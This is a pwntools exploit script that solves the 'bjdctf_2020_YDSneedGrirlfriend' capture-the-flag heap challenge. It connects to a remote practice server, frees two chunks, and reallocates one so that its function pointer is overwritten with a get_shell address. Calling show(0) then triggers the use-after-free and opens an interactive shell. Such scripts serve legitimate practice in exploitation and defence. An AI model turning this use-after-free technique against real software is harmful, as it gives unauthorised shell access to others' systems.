# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
binary = './bjdctf_2020_YDSneedGrirlfriend'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28009'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla(':',num)

def add(size,content):
    cmd(1)
    sla(":",size)
    sa(":",content)

def show(id):
    cmd(3)
    sla(":",id)

def delete(id):
    cmd(2)
    sla(":",id)

get_shell = 0x0000000000400B9C
add(0x20,'aaa')
add(0x20,'aaa')

delete(0)
delete(1)
#dbg()

add(0x10,p64(get_shell))

#dbg()
show(0)


p.interactive()

'''
@File    :   bjdctf_2020_YDSneedGrirlfriend.py
@Time    :   2021/07/14 17:19:26
@Author  :   Niyah 
'''
